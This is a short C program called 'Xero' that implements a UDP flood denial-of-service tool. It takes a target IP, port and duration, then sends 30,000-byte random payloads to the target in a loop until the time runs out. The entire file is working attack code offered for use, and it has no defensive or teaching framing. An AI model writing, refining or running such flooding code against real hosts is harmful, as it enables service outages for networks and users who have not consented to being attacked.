#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./Xero ip port time\n");
    exit(1);
}

// Function to generate a pseudo-random payload
void generate_heavy_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        if (i % 1000 == 0) {
            payload[i] = '\xFF';  // Add a structured pattern (for example, '\xFF')
        } else if (i % 500 == 0) {
            payload[i] = '\x00';  // Add null bytes at regular intervals
        } else {
            payload[i] = rand() % 256; // Random byte (0 to 255)
        }
    }
}

// The attack function for the thread
void *attack(void *arg) {
    char **args = (char **)arg;
    char *ip = args[0];
    int port = atoi(args[1]);
    int time_limit = atoi(args[2]);

    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Payload size increased to 30,000 bytes
    int payload_size = 30000;
    char payload[payload_size];

    // Generate the heavy payload
    generate_heavy_payload(payload, payload_size);

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    endtime = time(NULL) + time_limit;

    // Send heavy payloads until time limit is reached
    while (time(NULL) <= endtime) {
        if (sendto(sock, payload, sizeof(payload), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    printf("Attack finished\n");
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    pthread_t thread_id;
    char *args[] = {ip, argv[2], argv[3]};

    printf("Flood started on %s:%d for %d seconds\n", ip, port, time);

    if (pthread_create(&thread_id, NULL, attack, (void *)args) != 0) {
        perror("Thread creation failed");
        exit(1);
    }

    pthread_join(thread_id, NULL);

    printf("Flood completed.\n");
    return 0;
}
